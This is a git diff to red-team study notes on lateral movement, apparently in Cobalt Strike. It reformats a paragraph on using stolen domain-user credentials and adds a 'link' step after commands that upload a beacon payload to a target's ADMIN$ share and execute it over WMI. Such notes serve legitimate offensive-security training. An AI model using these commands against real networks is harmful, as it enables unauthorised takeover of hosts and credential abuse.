@@ -119,8 +119,8 @@ remote-exec [method] [target] [command]
 ```
 
 #### Using credentials
-Each of these strategies are compatible with the various credential and impersonation methods described in the next section, Credentials & User Impersonation. For instance, if you have plaintext 
-```credentials of a domain user who is a local administrator on a target, use ```make_token``` and then ```jump``` to use that user's credentials to move laterally to the target.
+- Each of these strategies are compatible with the various credential and impersonation methods described in the next section, Credentials & User Impersonation. For instance, if you have plaintext 
+- credentials of a domain user who is a local administrator on a target, use ```make_token``` and then ```jump``` to use that user's credentials to move laterally to the target.
 
 ### PowerShell Remoting
 #### Getting the architectur
@@ -144,6 +144,7 @@ jump psexec64 <HOSTNAME> smb
 cd \\<HOSTNAME>\ADMIN$
 upload C:\Payloads\beacon-smb.exe
 remote-exec wmi <HOSTNAME> C:\Windows\beacon-smb.exe
+link <HOSTNAME>
 ```
 
 #### CoInitializeSecurity
